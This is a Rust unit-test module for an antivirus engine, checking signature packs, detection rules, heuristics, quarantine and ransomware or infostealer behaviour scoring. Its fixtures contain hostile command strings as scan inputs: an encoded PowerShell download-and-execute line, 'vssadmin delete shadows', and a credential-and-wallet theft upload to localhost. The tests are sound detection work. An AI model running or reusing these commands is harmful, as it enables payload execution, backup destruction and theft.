#[cfg(test)]
mod tests {
    use std::fs;

    use crate::analyzers::{analyze_path, FileType};
    use crate::behavior::{BehaviorDecision, FileActivityEvent};
    use crate::config::EngineConfig;
    use crate::engine::{sha256_bytes, ZentorNativeEngine};
    use crate::heuristics;
    use crate::ml::NativeModelRunner;
    use crate::rules::RuleDb;
    use crate::scan::ScanActionMode;
    use crate::signatures::eicar_signature::EICAR_ASCII;
    use crate::signatures::{NativeSignature, SignatureDb, SignatureType};
    use crate::trust::Allowlist;
    use crate::verdict::{Confidence, ThreatCategory, Verdict};
    use chrono::Utc;

    fn test_engine() -> (tempfile::TempDir, ZentorNativeEngine) {
        let dir = tempfile::tempdir().unwrap();
        let assets = dir.path().join("assets/zentor_native");
        fs::create_dir_all(assets.join("signatures")).unwrap();
        fs::create_dir_all(assets.join("rules")).unwrap();
        fs::create_dir_all(assets.join("ml")).unwrap();
        fs::create_dir_all(assets.join("trust")).unwrap();
        fs::write(
            assets.join("signatures/zentor_core.zsig"),
            r#"{"format":"zentor-signature-pack-v1","version":"1","signatures":[]}"#,
        )
        .unwrap();
        let github_known_bad_hash = sha256_bytes(b"github known bad hash-only fixture");
        fs::write(
            assets.join("signatures/zentor_github_known_bad.zsig"),
            format!(
                r#"{{
  "format":"zentor-signature-pack-v1",
  "version":"test",
  "signatures":[{{
    "id":"ZGI-HASH-UNIT-001",
    "name":"GitHub malware-intel known-bad hash fixture",
    "version":"1",
    "category":"trojan",
    "confidence":"confirmed",
    "severity":"critical",
    "signature_type":"exact_hash",
    "pattern":"{github_known_bad_hash}",
    "mask":null,
    "offset":null,
    "file_types":["*"],
    "min_file_size":null,
    "max_file_size":null,
    "required_context":["Exact SHA-256 from GitHub malware-intel pack."],
    "false_positive_notes":"Hash-only test fixture; no malware binary is included.",
    "action_policy":"quarantine_if_policy_allows",
    "created_at":"2026-05-31T00:00:00Z",
    "updated_at":"2026-05-31T00:00:00Z"
  }}]
}}"#
            ),
        )
        .unwrap();
        fs::write(
            assets.join("rules/zentor_rules.zrule"),
            r#"{"format":"zentor-rule-pack-v1","version":"1","rules":[{"id":"ps_encoded_download_exec","name":"Suspicious PowerShell encoded downloader execution","description":"Encoded PowerShell with download and execution indicators.","category":"suspiciousScript","confidence":"high","verdict":"probableMalware","false_positive_notes":"Admin scripts can contain encoded commands; this rule requires download and execution indicators.","conditions":[{"type":"file_type","equals":"powershell_script"},{"type":"encoded_command"},{"type":"downloader_and_execution"}],"min_condition_matches":3,"action":"review_or_block_by_policy"}]}"#,
        )
        .unwrap();
        fs::write(
            assets.join("ml/zentor_native_model.zmodel"),
            r#"{"model_name":"Zentor Native Development Model","model_version":"0.1.0-dev","model_format_version":"zmodel-v1","feature_schema_version":"zne-features-v1","production_ready":false,"precision":0.0,"recall":0.0,"false_positive_rate":1.0,"bias":-3.0,"weights":{"encoded_command_flag":2.5,"suspicious_string_count":1.5,"double_extension":1.3,"known_bad_flag":5.0},"thresholds":{"suspicious":0.65,"probable_malware":0.86,"confirmed_malware":0.98},"limitations":["Development fixture model; not production protection."]}"#,
        )
        .unwrap();
        let known_bad_hash = sha256_bytes(b"harmless-known-bad-fixture");
        fs::write(
            assets.join("trust/zentor_known_good.ztrust"),
            r#"{"hashes":[]}"#,
        )
        .unwrap();
        fs::write(
            assets.join("trust/zentor_known_bad_test.ztrust"),
            format!(r#"{{"hashes":["{known_bad_hash}"]}}"#),
        )
        .unwrap();
        let mut config = EngineConfig::from_repo_root(dir.path());
        config.quarantine_dir = dir.path().join("quarantine");
        let engine = ZentorNativeEngine::initialize(config).unwrap();
        (dir, engine)
    }

    #[test]
    fn eicar_detected_by_native_signature() {
        let (_dir, mut engine) = test_engine();
        let verdict = engine
            .scan_bytes_for_test(
                std::path::PathBuf::from("eicar.txt"),
                EICAR_ASCII.as_bytes(),
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert_eq!(verdict.engine, "Zentor Native Engine");
        assert_eq!(verdict.final_verdict.verdict, Verdict::TestThreat);
    }

    #[test]
    fn normal_exe_in_downloads_is_not_malware() {
        let (dir, mut engine) = test_engine();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("expressvpn-windows-x64.exe");
        fs::write(&file, b"normal installer fixture").unwrap();
        let verdict = engine.scan_file(file, ScanActionMode::DetectOnly).unwrap();
        assert!(matches!(
            verdict.final_verdict.verdict,
            Verdict::Clean | Verdict::LikelyClean | Verdict::Observation
        ));
    }

    #[test]
    fn zentor_installer_exe_is_likely_clean_not_quarantine_eligible() {
        let (dir, mut engine) = test_engine();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("Zentor-AntiVirus-0.2.2-x64-setup.exe");
        fs::write(&file, b"zentor installer fixture").unwrap();
        let verdict = engine
            .scan_file(file, ScanActionMode::AutoQuarantineConfirmed)
            .unwrap();
        assert!(matches!(
            verdict.final_verdict.verdict,
            Verdict::LikelyClean | Verdict::Clean
        ));
        assert!(verdict.quarantine_record.is_none());
    }

    #[test]
    fn zentor_msi_is_likely_clean_not_quarantine_eligible() {
        let (dir, mut engine) = test_engine();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("Zentor-AntiVirus-0.2.2-x64.msi");
        fs::write(&file, b"zentor msi fixture").unwrap();
        let verdict = engine
            .scan_file(file, ScanActionMode::AutoQuarantineConfirmed)
            .unwrap();
        assert!(matches!(
            verdict.final_verdict.verdict,
            Verdict::LikelyClean | Verdict::Clean
        ));
        assert!(verdict.quarantine_record.is_none());
    }

    #[test]
    fn github_known_bad_sha256_pack_confirms_threat() {
        let (_dir, mut engine) = test_engine();
        let verdict = engine
            .scan_bytes_for_test(
                std::path::PathBuf::from("github-known-bad.bin"),
                b"github known bad hash-only fixture",
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert_eq!(verdict.final_verdict.verdict, Verdict::ConfirmedMalware);
        assert_eq!(verdict.final_verdict.confidence, Confidence::Confirmed);
        assert_eq!(verdict.final_verdict.category, ThreatCategory::Trojan);
        assert!(verdict.final_verdict.user_visible_explanation.contains(
            "GitHub malware-intel known-bad hash fixture"
        ));
    }

    #[test]
    fn github_known_bad_sha256_can_quarantine_by_policy() {
        let (dir, mut engine) = test_engine();
        let file = dir.path().join("github-known-bad.bin");
        fs::write(&file, b"github known bad hash-only fixture").unwrap();
        let verdict = engine
            .scan_file(file.clone(), ScanActionMode::AutoQuarantineConfirmed)
            .unwrap();
        assert_eq!(verdict.final_verdict.verdict, Verdict::ConfirmedMalware);
        assert!(verdict.quarantine_record.is_some());
        assert!(!file.exists());
    }

    #[test]
    fn encoded_powershell_rule_returns_probable() {
        let (dir, mut engine) = test_engine();
        let file = dir.path().join("dropper.ps1");
        fs::write(
            &file,
            b"powershell -EncodedCommand AAAA; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/a')",
        )
        .unwrap();
        let verdict = engine.scan_file(file, ScanActionMode::DetectOnly).unwrap();
        assert!(matches!(
            verdict.final_verdict.verdict,
            Verdict::Suspicious | Verdict::ProbableMalware
        ));
    }

    #[test]
    fn detect_only_never_quarantines() {
        let (dir, mut engine) = test_engine();
        let file = dir.path().join("eicar-memory.txt");
        let verdict = engine
            .scan_bytes_for_test(
                file.clone(),
                EICAR_ASCII.as_bytes(),
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert!(verdict.quarantine_record.is_none());
    }

    #[test]
    fn confirmed_mode_quarantines_eicar() {
        let (dir, mut engine) = test_engine();
        let file = dir.path().join("known_bad_fixture.bin");
        fs::write(&file, b"harmless-known-bad-fixture").unwrap();
        let verdict = engine
            .scan_file(file.clone(), ScanActionMode::AutoQuarantineConfirmed)
            .unwrap();
        assert!(verdict.quarantine_record.is_some());
        assert!(!file.exists());
    }

    #[test]
    fn signature_pack_loads_and_counts_builtin() {
        let (dir, _) = test_engine();
        let db = SignatureDb::load_pack(
            &dir.path()
                .join("assets/zentor_native/signatures/zentor_core.zsig"),
        )
        .unwrap();
        assert!(db.count() >= 1);
    }

    #[test]
    fn rule_pack_loads() {
        let (dir, _) = test_engine();
        let db = RuleDb::load_pack(
            &dir.path()
                .join("assets/zentor_native/rules/zentor_rules.zrule"),
        )
        .unwrap();
        assert_eq!(db.count(), 1);
    }

    #[test]
    fn zmodel_loads_and_is_development_only() {
        let (dir, _) = test_engine();
        let runner = NativeModelRunner::load(
            &dir.path()
                .join("assets/zentor_native/ml/zentor_native_model.zmodel"),
        )
        .unwrap();
        assert!(runner.is_loaded());
        assert!(!runner.production_ready());
    }

    #[test]
    fn archive_zip_slip_is_detected_by_analyzer() {
        let file = std::path::Path::new("sample.zip");
        let mut bytes = Vec::new();
        bytes.extend_from_slice(b"PK\x03\x04");
        bytes.extend_from_slice(&[0; 22]);
        let name = b"../evil.exe";
        bytes.extend_from_slice(&(name.len() as u16).to_le_bytes());
        bytes.extend_from_slice(&0u16.to_le_bytes());
        bytes.extend_from_slice(name);
        let analysis = analyze_path(file, &bytes).unwrap();
        assert_eq!(analysis.file_type, FileType::Zip);
        assert!(analysis.archive.unwrap().zip_slip_blocked);
    }

    #[test]
    fn allowlist_blocks_root_paths() {
        assert!(!Allowlist::validate_path("C:\\"));
        assert!(!Allowlist::validate_path("/"));
        assert!(Allowlist::validate_path("C:\\Users\\Brent\\Downloads"));
    }

    #[test]
    fn double_extension_increases_score() {
        let path = std::path::Path::new("invoice.pdf.exe");
        assert!(heuristics::filename::filename_risk(path) >= 25);
    }

    #[test]
    fn self_test_detects_eicar() {
        let (_, mut engine) = test_engine();
        let report = engine.engine_self_test().unwrap();
        assert!(report.eicar_detected);
        assert_eq!(report.overall_result, "pass");
    }

    #[test]
    fn compiler_rejects_broad_confirmed_string_signature() {
        let signature = NativeSignature {
            id: "ZNE-BROAD-BAD".to_string(),
            name: "Broad bad signature".to_string(),
            version: "1".to_string(),
            category: ThreatCategory::Unknown,
            confidence: Confidence::Confirmed,
            severity: "high".to_string(),
            signature_type: SignatureType::AsciiString,
            pattern: "cmd".to_string(),
            mask: None,
            offset: None,
            file_types: vec!["text".to_string()],
            min_file_size: None,
            max_file_size: None,
            required_context: vec![],
            false_positive_notes: "This intentionally broad fixture must be rejected.".to_string(),
            action_policy: "quarantine_if_policy_allows".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };
        assert!(crate::signatures::signature_compiler::validate_signatures(&[signature]).is_err());
    }

    #[test]
    fn compiler_outputs_pack_metadata_and_hash() {
        let signature = NativeSignature {
            id: "ZNE-HASH-TEST".to_string(),
            name: "Hash test signature".to_string(),
            version: "1".to_string(),
            category: ThreatCategory::TestThreat,
            confidence: Confidence::Confirmed,
            severity: "test".to_string(),
            signature_type: SignatureType::ExactHash,
            pattern: sha256_bytes(b"fixture").to_string(),
            mask: None,
            offset: None,
            file_types: vec!["*".to_string()],
            min_file_size: None,
            max_file_size: None,
            required_context: vec![],
            false_positive_notes: "Safe compiler test fixture.".to_string(),
            action_policy: "quarantine_if_policy_allows".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };
        let (pack, metadata) = crate::signatures::signature_compiler::compile_pack(
            vec![signature],
            "9.9.9".to_string(),
        )
        .unwrap();
        assert_eq!(pack.signatures.len(), 1);
        assert_eq!(metadata.signature_count, 1);
        assert!(pack.pack_sha256.is_some());
        assert_eq!(
            pack.pack_sha256.as_deref(),
            Some(metadata.pack_sha256.as_str())
        );
    }

    #[test]
    fn byte_pattern_offset_and_file_type_filter_are_enforced() {
        let signature = NativeSignature {
            id: "ZNE-OFFSET-TEST".to_string(),
            name: "Offset byte pattern".to_string(),
            version: "1".to_string(),
            category: ThreatCategory::Unknown,
            confidence: Confidence::Low,
            severity: "low".to_string(),
            signature_type: SignatureType::BytePattern,
            pattern: "DE AD BE EF".to_string(),
            mask: None,
            offset: Some(4),
            file_types: vec!["text".to_string()],
            min_file_size: None,
            max_file_size: None,
            required_context: vec![],
            false_positive_notes: "Offset matcher test fixture.".to_string(),
            action_policy: "review_only".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };
        let bytes = b"xxxx\xde\xad\xbe\xef";
        let analysis = analyze_path(std::path::Path::new("sample.txt"), bytes).unwrap();
        assert!(crate::signatures::signature_matcher::matches_signature(
            &signature,
            std::path::Path::new("sample.txt"),
            &sha256_bytes(bytes),
            bytes,
            &analysis
        )
        .is_some());

        let pe_analysis = analyze_path(
            std::path::Path::new("sample.exe"),
            b"MZxxxx\xde\xad\xbe\xef",
        )
        .unwrap();
        assert!(crate::signatures::signature_matcher::matches_signature(
            &signature,
            std::path::Path::new("sample.exe"),
            &sha256_bytes(b"MZxxxx\xde\xad\xbe\xef"),
            b"MZxxxx\xde\xad\xbe\xef",
            &pe_analysis
        )
        .is_none());
    }

    #[test]
    fn ransomware_activity_window_accumulates_process_behavior() {
        let (dir, mut engine) = test_engine();
        let process = dir.path().join("unknown.exe");
        fs::write(&process, b"harmless simulator").unwrap();
        let mut decision = BehaviorDecision::Allow;
        for index in 0..5 {
            decision = engine
                .analyze_file_activity(FileActivityEvent {
                    process_id: 777,
                    process_path: process.clone(),
                    affected_paths: vec![dir.path().join(format!("doc-{index}.txt"))],
                    files_modified_count: 6,
                    files_renamed_count: 4,
                    entropy_increase_count: 3,
                    ransom_note_created: index == 4,
                    backup_tamper_attempt: false,
                })
                .unwrap();
        }
        assert_eq!(decision, BehaviorDecision::StopProcess);
    }

    fn repo_root() -> std::path::PathBuf {
        std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .and_then(|path| path.parent())
            .unwrap()
            .to_path_buf()
    }

    fn repo_engine() -> ZentorNativeEngine {
        let mut config = EngineConfig::from_repo_root(repo_root());
        config.quarantine_dir = tempfile::tempdir().unwrap().keep();
        ZentorNativeEngine::initialize(config).unwrap()
    }

    #[test]
    fn repo_native_packs_detect_more_than_eicar() {
        let engine = repo_engine();
        let status = engine.status();
        assert!(status.signature_count >= 10);
        assert!(status.rule_count >= 8);
        assert!(status.compatibility_engines_disabled_by_default);
    }

    #[test]
    fn imported_known_bad_hash_fixture_is_confirmed() {
        let mut engine = repo_engine();
        let verdict = engine
            .scan_bytes_for_test(
                std::path::PathBuf::from("known-bad-ransomware-fixture.bin"),
                b"zentor harmless ransomware known bad fixture",
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert_eq!(verdict.final_verdict.verdict, Verdict::ConfirmedMalware);
        assert_eq!(verdict.final_verdict.category, ThreatCategory::Ransomware);
    }

    #[test]
    fn script_downloader_indicator_becomes_probable() {
        let mut engine = repo_engine();
        let bytes = b"powershell -EncodedCommand AAAA; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/payload.txt'); Start-Process calc.exe";
        let verdict = engine
            .scan_bytes_for_test(
                std::path::PathBuf::from("downloader.ps1"),
                bytes,
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert_eq!(verdict.final_verdict.category, ThreatCategory::SuspiciousDownloader);
        assert!(matches!(
            verdict.final_verdict.verdict,
            Verdict::Suspicious | Verdict::ProbableMalware
        ));
    }

    #[test]
    fn ransomware_indicator_combination_is_probable() {
        let mut engine = repo_engine();
        let bytes = b"your files have been encrypted. decrypt your files. vssadmin delete shadows /all /quiet";
        let verdict = engine
            .scan_bytes_for_test(
                std::path::PathBuf::from("ransom-note-script.ps1"),
                bytes,
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert_eq!(verdict.final_verdict.category, ThreatCategory::Ransomware);
        assert!(matches!(
            verdict.final_verdict.verdict,
            Verdict::Suspicious | Verdict::ProbableMalware
        ));
    }

    #[test]
    fn infostealer_indicator_combination_is_probable() {
        let mut engine = repo_engine();
        let bytes = b"read browser credentials from Login Data and wallet.dat then zip staging archive and POST to http://127.0.0.1/upload";
        let verdict = engine
            .scan_bytes_for_test(
                std::path::PathBuf::from("collector.js"),
                bytes,
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert_eq!(verdict.final_verdict.category, ThreatCategory::Infostealer);
        assert!(matches!(
            verdict.final_verdict.verdict,
            Verdict::Suspicious | Verdict::ProbableMalware
        ));
    }

    #[test]
    fn miner_pup_indicator_is_review_not_confirmed() {
        let mut engine = repo_engine();
        let bytes = b"stratum+tcp://pool.example.invalid schtasks /create /tn worker";
        let verdict = engine
            .scan_bytes_for_test(
                std::path::PathBuf::from("miner-config.ps1"),
                bytes,
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert_eq!(verdict.final_verdict.category, ThreatCategory::Miner);
        assert_ne!(verdict.final_verdict.verdict, Verdict::ConfirmedMalware);
    }

    #[test]
    fn threat_intel_hash_importer_builds_signature_pack() {
        use crate::threat_intel::{
            import_hash_lines, zentor_pack_builder::indicators_to_signature_pack_json,
            ThreatIntelSource, ThreatIntelSourceType,
        };
        let source = ThreatIntelSource {
            source_name: "unit-test-feed".to_string(),
            source_url: None,
            source_type: ThreatIntelSourceType::TestFixture,
        };
        let indicators = import_hash_lines(
            &source,
            vec!["84335dd8dd5b649882212609dc875225260878ceadbca9713d4079b7112e3514".to_string()],
            ThreatCategory::Trojan,
        )
        .unwrap();
        assert_eq!(indicators.len(), 1);
        let pack_json = indicators_to_signature_pack_json(&indicators, "unit").unwrap();
        assert!(pack_json.contains("zentor-signature-pack-v1"));
    }

    #[test]
    fn threat_intel_importer_rejects_malformed_hash() {
        use crate::threat_intel::{import_hash_lines, ThreatIntelSource, ThreatIntelSourceType};
        let source = ThreatIntelSource {
            source_name: "unit-test-feed".to_string(),
            source_url: None,
            source_type: ThreatIntelSourceType::TestFixture,
        };
        assert!(import_hash_lines(
            &source,
            vec!["not-a-hash".to_string()],
            ThreatCategory::Trojan,
        )
        .is_err());
    }

    #[test]
    fn infostealer_behavior_requires_multiple_signals() {
        let weak = crate::behavior::infostealer_behavior::InfostealerBehaviorEvent {
            process_id: 10,
            browser_store_reads: 1,
            wallet_file_reads: 0,
            archive_created: false,
            outbound_network_after_access: false,
        };
        assert!(crate::behavior::infostealer_behavior::analyze(&weak).is_none());

        let strong = crate::behavior::infostealer_behavior::InfostealerBehaviorEvent {
            process_id: 10,
            browser_store_reads: 3,
            wallet_file_reads: 1,
            archive_created: true,
            outbound_network_after_access: true,
        };
        assert!(crate::behavior::infostealer_behavior::analyze(&strong).is_some());
    }
}
